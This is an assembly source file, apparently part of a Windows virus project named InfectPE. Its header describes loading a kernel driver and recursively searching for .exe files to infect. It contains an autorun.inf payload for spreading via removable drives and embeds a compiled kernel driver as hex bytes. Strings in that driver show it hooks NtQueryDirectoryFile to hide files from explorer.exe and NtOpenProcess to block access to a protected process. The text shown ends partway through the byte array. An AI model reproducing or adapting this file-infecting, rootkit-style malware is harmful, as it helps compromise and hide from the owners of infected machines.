;-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
; Module: InfectPE.asm
; Author: lazy_cat (crazy.cat@foxmail.com)
; Create Date: 2010-12-18
; Environment: User Mode.
; Project Description: This module is responsible for load kernel driver, recursive
;                      search .exe file for infect.
;-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
.586
.model	flat,stdcall
option	casemap:none


SHGetSpecialFolderPathA	proto	:DWORD,:DWORD,:DWORD,:DWORD
SHGetSpecialFolderPath	equ	<SHGetSpecialFolderPathA>

include		windows.inc
include		user32.inc
include		kernel32.inc
include		advapi32.inc
include		msvcrt.inc
includelib	shell32.lib
includelib	user32.lib
includelib	kernel32.lib
includelib	msvcrt.lib
includelib	Advapi32.lib

.const
szSeparator	db	'\', 0
szFileFilter	db	'\*.*', 0
szExeExt	db	'.exe', 0

szSglDot	db	'.', 0
szDblDot	db	'..', 0

szFileRlsPath	db	'C:\InfectPE.sys',0
szServiceName	db	'InfectPESvc',0

szAtRunFileName	db	'AUTORUN.INF',0
szAtRunBytes	db	'[autorun]',0Dh,0Ah
		db	'open=InfectPE.exe',0


; Communicate with the driver
;#define IOCTL_INFECTPE CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)
IOCTL_INFECTPE	equ	222000h
szSymbbolicLink	db	'\\.\InfectPE',0

; Checked Version Driver.
SysFileBytes	db	04Dh, 05Ah, 090h, 000h, 003h, 000h, 000h, 000h, 004h, 000h, 000h, 000h, 0FFh, 0FFh, 000h, 000h
		db	0B8h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 040h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
		db	000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
		db	000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 040h, 002h, 000h, 000h
		db	00Eh, 01Fh, 0BAh, 00Eh, 000h, 0B4h, 009h, 0CDh, 021h, 0B8h, 001h, 04Ch, 0CDh, 021h, 054h, 068h
		db	069h, 073h, 020h, 070h, 072h, 06Fh, 067h, 072h, 061h, 06Dh, 020h, 063h, 061h, 06Eh, 06Eh, 06Fh
		db	074h, 020h, 062h, 065h, 020h, 072h, 075h, 06Eh, 020h, 069h, 06Eh, 020h, 044h, 04Fh, 053h, 020h
		db	06Dh, 06Fh, 064h, 065h, 02Eh, 00Dh, 00Dh, 00Ah, 024h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
		db	000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
		db	000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
		db	000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
		db	000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
		db	000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
		db	000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
		db	000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
		db	000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
		db	000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
		db	000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
		db	000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
		db	000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
		db	000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
		db	000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
		db	000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
		db	000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
		db	000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
		db	000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
		db	000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
		db	000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
		db	000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
		db	000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
		db	000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
		db	000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
		db	013h, 030h, 08Ah, 05Dh, 057h, 051h, 0E4h, 00Eh, 057h, 051h, 0E4h, 00Eh, 057h, 051h, 0E4h, 00Eh
		db	057h, 051h, 0E5h, 00Eh, 058h, 051h, 0E4h, 00Eh, 094h, 05Eh, 0B9h, 00Eh, 054h, 051h, 0E4h, 00Eh
		db	094h, 05Eh, 0BBh, 00Eh, 054h, 051h, 0E4h, 00Eh, 094h, 05Eh, 0BEh, 00Eh, 056h, 051h, 0E4h, 00Eh
		db	052h, 069h, 063h, 068h, 057h, 051h, 0E4h, 00Eh, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
		db	050h, 045h, 000h, 000h, 04Ch, 001h, 006h, 000h, 06Bh, 05Dh, 0CAh, 04Dh, 000h, 000h, 000h, 000h
		db	000h, 000h, 000h, 000h, 0E0h, 000h, 00Eh, 001h, 00Bh, 001h, 007h, 00Ah, 080h, 00Eh, 000h, 000h
		db	080h, 002h, 000h, 000h, 000h, 000h, 000h, 000h, 07Fh, 012h, 000h, 000h, 080h, 004h, 000h, 000h
		db	000h, 00Ch, 000h, 000h, 000h, 000h, 001h, 000h, 080h, 000h, 000h, 000h, 080h, 000h, 000h, 000h
		db	005h, 000h, 001h, 000h, 005h, 000h, 001h, 000h, 005h, 000h, 001h, 000h, 000h, 000h, 000h, 000h
		db	080h, 015h, 000h, 000h, 080h, 004h, 000h, 000h, 038h, 02Ch, 000h, 000h, 001h, 000h, 000h, 004h
		db	000h, 000h, 004h, 000h, 000h, 010h, 000h, 000h, 000h, 000h, 010h, 000h, 000h, 010h, 000h, 000h
		db	000h, 000h, 000h, 000h, 010h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
		db	0C8h, 012h, 000h, 000h, 028h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
		db	000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
		db	080h, 014h, 000h, 000h, 0C8h, 000h, 000h, 000h, 040h, 00Ch, 000h, 000h, 01Ch, 000h, 000h, 000h
		db	000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
		db	000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
		db	000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 00Ch, 000h, 000h, 040h, 000h, 000h, 000h
		db	000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
		db	000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 02Eh, 074h, 065h, 078h, 074h, 000h, 000h, 000h
		db	036h, 007h, 000h, 000h, 080h, 004h, 000h, 000h, 080h, 007h, 000h, 000h, 080h, 004h, 000h, 000h
		db	000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 020h, 000h, 000h, 068h
		db	02Eh, 072h, 064h, 061h, 074h, 061h, 000h, 000h, 0FEh, 000h, 000h, 000h, 000h, 00Ch, 000h, 000h
		db	000h, 001h, 000h, 000h, 000h, 00Ch, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
		db	000h, 000h, 000h, 000h, 040h, 000h, 000h, 048h, 02Eh, 064h, 061h, 074h, 061h, 000h, 000h, 000h
		db	03Ch, 000h, 000h, 000h, 000h, 00Dh, 000h, 000h, 080h, 000h, 000h, 000h, 000h, 00Dh, 000h, 000h
		db	000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 040h, 000h, 000h, 0C8h
		db	050h, 041h, 047h, 045h, 000h, 000h, 000h, 000h, 03Ch, 001h, 000h, 000h, 080h, 00Dh, 000h, 000h
		db	080h, 001h, 000h, 000h, 080h, 00Dh, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
		db	000h, 000h, 000h, 000h, 020h, 000h, 000h, 060h, 049h, 04Eh, 049h, 054h, 000h, 000h, 000h, 000h
		db	06Eh, 005h, 000h, 000h, 000h, 00Fh, 000h, 000h, 080h, 005h, 000h, 000h, 000h, 00Fh, 000h, 000h
		db	000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 020h, 000h, 000h, 0E2h
		db	02Eh, 072h, 065h, 06Ch, 06Fh, 063h, 000h, 000h, 0E4h, 000h, 000h, 000h, 080h, 014h, 000h, 000h
		db	000h, 001h, 000h, 000h, 080h, 014h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
		db	000h, 000h, 000h, 000h, 040h, 000h, 000h, 042h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
		db	000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
		db	000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
		db	000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
		db	000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
		db	000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
		db	05Bh, 062h, 079h, 020h, 06Ch, 061h, 07Ah, 079h, 05Fh, 063h, 061h, 074h, 05Dh, 020h, 045h, 06Eh
		db	074h, 065h, 072h, 020h, 049h, 06Eh, 066h, 065h, 063h, 074h, 070h, 065h, 04Eh, 074h, 051h, 075h
		db	065h, 072h, 079h, 044h, 069h, 072h, 065h, 063h, 074h, 06Fh, 072h, 079h, 046h, 069h, 06Ch, 065h
		db	00Ah, 000h, 000h, 000h, 05Bh, 062h, 079h, 020h, 06Ch, 061h, 07Ah, 079h, 05Fh, 063h, 061h, 074h
		db	05Dh, 020h, 04Eh, 074h, 051h, 075h, 065h, 072h, 079h, 044h, 069h, 072h, 065h, 063h, 074h, 06Fh
		db	072h, 079h, 046h, 069h, 06Ch, 065h, 028h, 029h, 020h, 072h, 065h, 074h, 075h, 072h, 06Eh, 073h
		db	020h, 061h, 06Eh, 020h, 065h, 072h, 072h, 06Fh, 072h, 02Eh, 00Ah, 000h, 05Bh, 062h, 079h, 020h
		db	06Ch, 061h, 07Ah, 079h, 05Fh, 063h, 061h, 074h, 05Dh, 020h, 04Ch, 065h, 061h, 076h, 065h, 020h
		db	049h, 06Eh, 066h, 065h, 063h, 074h, 070h, 065h, 04Eh, 074h, 051h, 075h, 065h, 072h, 079h, 044h
		db	069h, 072h, 065h, 063h, 074h, 06Fh, 072h, 079h, 046h, 069h, 06Ch, 065h, 00Ah, 000h, 000h, 000h
		db	05Bh, 062h, 079h, 020h, 06Ch, 061h, 07Ah, 079h, 05Fh, 063h, 061h, 074h, 05Dh, 020h, 045h, 078h
		db	041h, 06Ch, 06Ch, 06Fh, 063h, 061h, 074h, 065h, 050h, 06Fh, 06Fh, 06Ch, 057h, 069h, 074h, 068h
		db	054h, 061h, 067h, 028h, 029h, 020h, 066h, 061h, 069h, 06Ch, 065h, 064h, 02Eh, 00Ah, 000h, 000h
		db	05Bh, 062h, 079h, 020h, 06Ch, 061h, 07Ah, 079h, 05Fh, 063h, 061h, 074h, 05Dh, 020h, 04Ch, 065h
		db	061h, 076h, 065h, 020h, 049h, 06Eh, 066h, 065h, 063h, 074h, 070h, 065h, 04Eh, 074h, 051h, 075h
		db	065h, 072h, 079h, 044h, 069h, 072h, 065h, 063h, 074h, 06Fh, 072h, 079h, 046h, 069h, 06Ch, 065h
		db	00Ah, 000h, 000h, 000h, 049h, 000h, 06Eh, 000h, 066h, 000h, 065h, 000h, 063h, 000h, 074h, 000h
		db	050h, 000h, 045h, 000h, 000h, 000h, 000h, 000h, 05Bh, 062h, 079h, 020h, 06Ch, 061h, 07Ah, 079h
		db	05Fh, 063h, 061h, 074h, 05Dh, 020h, 046h, 069h, 06Ch, 065h, 020h, 04Eh, 061h, 06Dh, 065h, 03Ah
		db	020h, 025h, 077h, 073h, 00Ah, 000h, 000h, 000h, 05Bh, 062h, 079h, 020h, 06Ch, 061h, 07Ah, 079h
		db	05Fh, 063h, 061h, 074h, 05Dh, 020h, 044h, 065h, 074h, 065h, 063h, 074h, 020h, 05Bh, 025h, 077h
		db	073h, 05Dh, 02Ch, 020h, 074h, 068h, 069h, 073h, 020h, 066h, 069h, 06Ch, 065h, 020h, 077h, 069h
		db	06Ch, 06Ch, 020h, 06Eh, 06Fh, 074h, 020h, 073h, 068h, 06Fh, 077h, 020h, 069h, 06Eh, 020h, 065h
		db	078h, 070h, 06Ch, 06Fh, 072h, 065h, 072h, 02Eh, 065h, 078h, 065h, 00Ah, 000h, 000h, 000h, 000h
		db	05Bh, 062h, 079h, 020h, 06Ch, 061h, 07Ah, 079h, 05Fh, 063h, 061h, 074h, 05Dh, 020h, 04Ch, 065h
		db	061h, 076h, 065h, 020h, 049h, 06Eh, 066h, 065h, 063h, 074h, 070h, 065h, 04Eh, 074h, 051h, 075h
		db	065h, 072h, 079h, 044h, 069h, 072h, 065h, 063h, 074h, 06Fh, 072h, 079h, 046h, 069h, 06Ch, 065h
		db	00Ah, 000h, 0CCh, 0CCh, 0CCh, 0CCh, 0CCh, 0CCh, 0CCh, 0CCh, 0CCh, 0CCh, 0CCh, 0CCh, 0CCh, 0CCh
		db	08Bh, 0FFh, 055h, 08Bh, 0ECh, 081h, 0ECh, 024h, 002h, 000h, 000h, 0A1h, 02Ch, 00Dh, 001h, 000h
		db	089h, 045h, 0E4h, 056h, 057h, 0C7h, 045h, 0ECh, 001h, 000h, 000h, 0C0h, 0C7h, 045h, 0E8h, 000h
		db	000h, 000h, 000h, 0C7h, 045h, 0F4h, 000h, 000h, 000h, 000h, 0C7h, 045h, 0F8h, 000h, 000h, 000h
		db	000h, 0C7h, 045h, 0FCh, 000h, 000h, 000h, 000h, 0C7h, 045h, 0F0h, 000h, 000h, 000h, 000h, 068h
		db	080h, 004h, 001h, 000h, 0E8h, 027h, 005h, 000h, 000h, 083h, 0C4h, 004h, 08Ah, 045h, 030h, 050h
		db	08Bh, 04Dh, 02Ch, 051h, 08Ah, 055h, 028h, 052h, 08Bh, 045h, 024h, 050h, 08Bh, 04Dh, 020h, 051h
		db	08Bh, 055h, 01Ch, 052h, 08Bh, 045h, 018h, 050h, 08Bh, 04Dh, 014h, 051h, 08Bh, 055h, 010h, 052h
		db	08Bh, 045h, 00Ch, 050h, 08Bh, 04Dh, 008h, 051h, 0FFh, 015h, 030h, 00Dh, 001h, 000h, 089h, 045h
		db	0ECh, 083h, 07Dh, 0ECh, 000h, 07Dh, 022h, 068h, 0B4h, 004h, 001h, 000h, 0E8h, 0DFh, 004h, 000h
		db	000h, 083h, 0C4h, 004h, 068h, 0ECh, 004h, 001h, 000h, 0E8h, 0D2h, 004h, 000h, 000h, 083h, 0C4h
		db	004h, 08Bh, 045h, 0ECh, 0E9h, 0A0h, 001h, 000h, 000h, 068h, 072h, 065h, 078h, 076h, 08Bh, 055h
		db	020h, 052h, 06Ah, 001h, 0FFh, 015h, 024h, 00Ch, 001h, 000h, 089h, 045h, 0F4h, 083h, 07Dh, 0F4h
		db	000h, 075h, 022h, 068h, 020h, 005h, 001h, 000h, 0E8h, 0A3h, 004h, 000h, 000h, 083h, 0C4h, 004h
		db	068h, 050h, 005h, 001h, 000h, 0E8h, 096h, 004h, 000h, 000h, 083h, 0C4h, 004h, 08Bh, 045h, 0ECh
		db	0E9h, 064h, 001h, 000h, 000h, 08Bh, 045h, 0F4h, 089h, 045h, 0F8h, 08Bh, 04Dh, 020h, 033h, 0C0h
		db	08Bh, 07Dh, 0F4h, 08Bh, 0D1h, 0C1h, 0E9h, 002h, 0F3h, 0ABh, 08Bh, 0CAh, 083h, 0E1h, 003h, 0F3h
		db	0AAh, 08Bh, 045h, 024h, 089h, 085h, 0DCh, 0FDh, 0FFh, 0FFh, 083h, 0BDh, 0DCh, 0FDh, 0FFh, 0FFh
		db	003h, 074h, 005h, 0E9h, 012h, 001h, 000h, 000h, 08Bh, 04Dh, 01Ch, 089h, 04Dh, 0E8h, 08Bh, 055h
		db	0E8h, 089h, 055h, 0FCh, 0B8h, 001h, 000h, 000h, 000h, 085h, 0C0h, 00Fh, 084h, 0D9h, 000h, 000h
		db	000h, 06Ah, 010h, 068h, 084h, 005h, 001h, 000h, 08Bh, 04Dh, 0E8h, 083h, 0C1h, 05Eh, 051h, 0FFh
		db	015h, 020h, 00Ch, 001h, 000h, 083h, 0F8h, 010h, 074h, 056h, 08Bh, 055h, 0E8h, 08Bh, 002h, 089h
		db	045h, 0F0h, 08Bh, 04Dh, 0E8h, 083h, 0C1h, 05Eh, 051h, 068h, 098h, 005h, 001h, 000h, 0E8h, 00Dh
		db	004h, 000h, 000h, 083h, 0C4h, 008h, 083h, 07Dh, 0F0h, 000h, 075h, 00Ch, 08Bh, 055h, 0E8h, 08Bh
		db	042h, 03Ch, 083h, 0C0h, 060h, 089h, 045h, 0F0h, 08Bh, 04Dh, 0F0h, 08Bh, 075h, 0E8h, 08Bh, 07Dh
		db	0F8h, 08Bh, 0D1h, 0C1h, 0E9h, 002h, 0F3h, 0A5h, 08Bh, 0CAh, 083h, 0E1h, 003h, 0F3h, 0A4h, 08Bh
		db	045h, 0F8h, 089h, 045h, 0FCh, 08Bh, 04Dh, 0F8h, 003h, 04Dh, 0F0h, 089h, 04Dh, 0F8h, 0EBh, 04Eh
		db	066h, 0C7h, 085h, 0E0h, 0FDh, 0FFh, 0FFh, 000h, 000h, 0B9h, 07Fh, 000h, 000h, 000h, 033h, 0C0h
		db	08Dh, 0BDh, 0E2h, 0FDh, 0FFh, 0FFh, 0F3h, 0ABh, 066h, 0ABh, 08Bh, 055h, 0E8h, 08Bh, 04Ah, 03Ch
		db	08Bh, 075h, 0E8h, 083h, 0C6h, 05Eh, 08Dh, 0BDh, 0E0h, 0FDh, 0FFh, 0FFh, 08Bh, 0C1h, 0C1h, 0E9h
		db	002h, 0F3h, 0A5h, 08Bh, 0C8h, 083h, 0E1h, 003h, 0F3h, 0A4h, 08Dh, 08Dh, 0E0h, 0FDh, 0FFh, 0FFh
		db	051h, 068h, 0B8h, 005h, 001h, 000h, 0E8h, 085h, 003h, 000h, 000h, 083h, 0C4h, 008h, 08Bh, 055h
		db	0E8h, 083h, 03Ah, 000h, 074h, 00Dh, 08Bh, 045h, 0E8h, 08Bh, 04Dh, 0E8h, 003h, 008h, 089h, 04Dh
		db	0E8h, 0EBh, 002h, 0EBh, 005h, 0E9h, 01Ah, 0FFh, 0FFh, 0FFh, 08Bh, 055h, 0FCh, 0C7h, 002h, 000h
		db	000h, 000h, 000h, 08Bh, 04Dh, 020h, 08Bh, 075h, 0F4h, 08Bh, 07Dh, 01Ch, 08Bh, 0C1h, 0C1h, 0E9h
		db	002h, 0F3h, 0A5h, 08Bh, 0C8h, 083h, 0E1h, 003h, 0F3h, 0A4h, 068h, 072h, 065h, 078h, 076h, 08Bh
		db	04Dh, 0F4h, 051h, 0FFh, 015h, 01Ch, 00Ch, 001h, 000h, 068h, 000h, 006h, 001h, 000h, 0E8h, 02Dh
		db	003h, 000h, 000h, 083h, 0C4h, 004h, 08Bh, 045h, 0ECh, 08Bh, 04Dh, 0E4h, 0E8h, 004h, 003h, 000h
		db	000h, 05Fh, 05Eh, 08Bh, 0E5h, 05Dh, 0C2h, 02Ch, 000h, 0CCh, 0CCh, 0CCh, 0CCh, 0CCh, 0CCh, 0CCh
		db	05Bh, 062h, 079h, 020h, 06Ch, 061h, 07Ah, 079h, 05Fh, 063h, 061h, 074h, 05Dh, 020h, 052h, 065h
		db	063h, 065h, 069h, 076h, 065h, 020h, 050h, 072h, 06Fh, 063h, 065h, 073h, 073h, 020h, 049h, 044h
		db	03Ah, 020h, 025h, 064h, 00Ah, 000h, 0CCh, 0CCh, 0CCh, 0CCh, 0CCh, 0CCh, 0CCh, 0CCh, 0CCh, 0CCh
		db	08Bh, 0FFh, 055h, 08Bh, 0ECh, 083h, 0ECh, 008h, 08Bh, 045h, 00Ch, 08Bh, 048h, 060h, 089h, 04Dh
		db	0FCh, 08Bh, 055h, 0FCh, 08Bh, 042h, 00Ch, 089h, 045h, 0F8h, 081h, 07Dh, 0F8h, 000h, 020h, 022h
		db	000h, 074h, 002h, 0EBh, 042h, 08Bh, 04Dh, 00Ch, 08Bh, 051h, 00Ch, 08Bh, 002h, 0A3h, 038h, 00Dh
		db	001h, 000h, 08Bh, 04Dh, 00Ch, 08Bh, 051h, 00Ch, 0C7h, 002h, 001h, 000h, 000h, 000h, 0A1h, 038h
		db	00Dh, 001h, 000h, 050h, 068h, 0A0h, 008h, 001h, 000h, 0E8h, 092h, 002h, 000h, 000h, 083h, 0C4h
		db	008h, 08Bh, 04Dh, 00Ch, 0C7h, 041h, 018h, 000h, 000h, 000h, 000h, 08Bh, 055h, 00Ch, 0C7h, 042h
		db	01Ch, 004h, 000h, 000h, 000h, 0EBh, 014h, 08Bh, 045h, 00Ch, 0C7h, 040h, 018h, 001h, 000h, 000h
		db	0C0h, 08Bh, 04Dh, 00Ch, 0C7h, 041h, 01Ch, 000h, 000h, 000h, 000h, 032h, 0D2h, 08Bh, 04Dh, 00Ch
		db	0FFh, 015h, 028h, 00Ch, 001h, 000h, 033h, 0C0h, 08Bh, 0E5h, 05Dh, 0C2h, 008h, 000h, 0CCh, 0CCh
		db	05Bh, 062h, 079h, 020h, 06Ch, 061h, 07Ah, 079h, 05Fh, 063h, 061h, 074h, 05Dh, 020h, 052h, 065h
		db	063h, 065h, 069h, 076h, 065h, 020h, 049h, 052h, 050h, 020h, 052h, 065h, 071h, 075h, 065h, 073h
		db	074h, 03Ah, 020h, 025h, 073h, 00Ah, 000h, 000h, 05Bh, 062h, 079h, 020h, 06Ch, 061h, 07Ah, 079h
		db	05Fh, 063h, 061h, 074h, 05Dh, 020h, 052h, 065h, 063h, 065h, 069h, 076h, 065h, 020h, 055h, 06Eh
		db	06Bh, 06Eh, 06Fh, 077h, 06Eh, 020h, 049h, 052h, 050h, 020h, 052h, 065h, 071h, 075h, 065h, 073h
		db	074h, 00Ah, 000h, 0CCh, 0CCh, 0CCh, 0CCh, 0CCh, 0CCh, 0CCh, 0CCh, 0CCh, 0CCh, 0CCh, 0CCh, 0CCh
		db	08Bh, 0FFh, 055h, 08Bh, 0ECh, 083h, 0ECh, 008h, 0C7h, 045h, 0FCh, 000h, 000h, 000h, 000h, 08Bh
		db	045h, 00Ch, 08Bh, 048h, 060h, 089h, 04Dh, 0F8h, 0C7h, 045h, 0FCh, 000h, 000h, 000h, 000h, 0EBh
		db	009h, 08Bh, 055h, 0FCh, 083h, 0C2h, 001h, 089h, 055h, 0FCh, 083h, 07Dh, 0FCh, 005h, 073h, 03Bh
		db	08Bh, 045h, 0F8h, 00Fh, 0B6h, 008h, 08Bh, 055h, 0FCh, 03Bh, 00Ch, 0D5h, 000h, 00Dh, 001h, 000h
		db	075h, 027h, 08Bh, 045h, 0FCh, 08Bh, 00Ch, 0C5h, 004h, 00Dh, 001h, 000h, 051h, 068h, 060h, 009h
		db	001h, 000h, 0E8h, 099h, 001h, 000h, 000h, 083h, 0C4h, 008h, 032h, 0D2h, 08Bh, 04Dh, 00Ch, 0FFh
		db	015h, 028h, 00Ch, 001h, 000h, 033h, 0C0h, 0EBh, 01Fh, 0EBh, 0B6h, 068h, 088h, 009h, 001h, 000h
		db	0E8h, 07Bh, 001h, 000h, 000h, 083h, 0C4h, 004h, 032h, 0D2h, 08Bh, 04Dh, 00Ch, 0FFh, 015h, 028h
		db	00Ch, 001h, 000h, 0B8h, 001h, 000h, 000h, 0C0h, 08Bh, 0E5h, 05Dh, 0C2h, 008h, 000h, 0CCh, 0CCh
		db	05Bh, 062h, 079h, 020h, 06Ch, 061h, 07Ah, 079h, 05Fh, 063h, 061h, 074h, 05Dh, 020h, 045h, 06Eh
		db	074h, 065h, 072h, 020h, 049h, 06Eh, 066h, 065h, 063h, 074h, 070h, 065h, 04Eh, 074h, 04Fh, 070h
		db	065h, 06Eh, 050h, 072h, 06Fh, 063h, 065h, 073h, 073h, 00Ah, 000h, 000h, 000h, 000h, 000h, 000h
		db	05Bh, 062h, 079h, 020h, 06Ch, 061h, 07Ah, 079h, 05Fh, 063h, 061h, 074h, 05Dh, 020h, 052h, 065h
		db	071h, 075h, 065h, 073h, 074h, 020h, 06Fh, 070h, 065h, 06Eh, 069h, 06Eh, 067h, 020h, 074h, 068h
		db	065h, 020h, 070h, 072h, 06Fh, 074h, 065h, 063h, 074h, 065h, 064h, 020h, 070h, 072h, 06Fh, 063h
		db	065h, 073h, 073h, 02Ch, 020h, 061h, 063h, 063h, 065h, 073h, 073h, 020h, 064h, 065h, 06Eh, 069h
		db	065h, 064h, 00Ah, 000h, 05Bh, 062h, 079h, 020h, 06Ch, 061h, 07Ah, 079h, 05Fh, 063h, 061h, 074h
		db	05Dh, 020h, 04Ch, 065h, 061h, 076h, 065h, 020h, 049h, 06Eh, 066h, 065h, 063h, 074h, 070h, 065h
		db	04Eh, 074h, 04Fh, 070h, 065h, 06Eh, 050h, 072h, 06Fh, 063h, 065h, 073h, 073h, 00Ah, 000h, 0CCh
		db	0CCh, 0CCh, 0CCh, 0CCh, 0CCh, 0CCh, 0CCh, 0CCh, 0CCh, 0CCh, 0CCh, 0CCh, 0CCh, 0CCh, 0CCh, 0CCh
		db	08Bh, 0FFh, 055h, 08Bh, 0ECh, 051h, 068h, 050h, 00Ah, 001h, 000h, 0E8h, 0A0h, 000h, 000h, 000h
		db	083h, 0C4h, 004h, 08Bh, 045h, 014h, 08Bh, 00Dh, 038h, 00Dh, 001h, 000h, 03Bh, 008h, 075h, 016h
		db	068h, 080h, 00Ah, 001h, 000h, 0E8h, 086h, 000h, 000h, 000h, 083h, 0C4h, 004h, 0C7h, 045h, 0FCh
		db	001h, 000h, 000h, 0C0h, 0EBh, 019h, 08Bh, 055h, 014h, 052h, 08Bh, 045h, 010h, 050h, 08Bh, 04Dh
		db	00Ch, 051h, 08Bh, 055h, 008h, 052h, 0FFh, 015h, 034h, 00Dh, 001h, 000h, 089h, 045h, 0FCh, 068h
		db	0C4h, 00Ah, 001h, 000h, 0E8h, 057h, 000h, 000h, 000h, 083h, 0C4h, 004h, 08Bh, 045h, 0FCh, 08Bh
		db	0E5h, 05Dh, 0C2h, 010h, 000h, 0CCh, 0CCh, 0CCh, 0CCh, 0CCh, 08Bh, 0FFh, 055h, 08Bh, 0ECh, 051h
		db	089h, 04Dh, 0FCh, 06Ah, 000h, 0FFh, 035h, 028h, 00Dh, 001h, 000h, 0FFh, 035h, 02Ch, 00Dh, 001h
		db	000h, 0FFh, 075h, 0FCh, 068h, 0F7h, 000h, 000h, 000h, 0FFh, 015h, 038h, 00Ch, 001h, 000h, 0CCh
		db	0CCh, 0CCh, 0CCh, 0CCh, 0CCh, 03Bh, 00Dh, 02Ch, 00Dh, 001h, 000h, 075h, 009h, 0F7h, 0C1h, 000h
		db	000h, 0FFh, 0FFh, 075h, 001h, 0C3h, 0E9h, 0BFh, 0FFh, 0FFh, 0FFh, 0CCh, 0CCh, 0CCh, 0CCh, 0CCh
		db	0FFh, 025h, 00Ch, 00Ch, 001h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
		db	000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
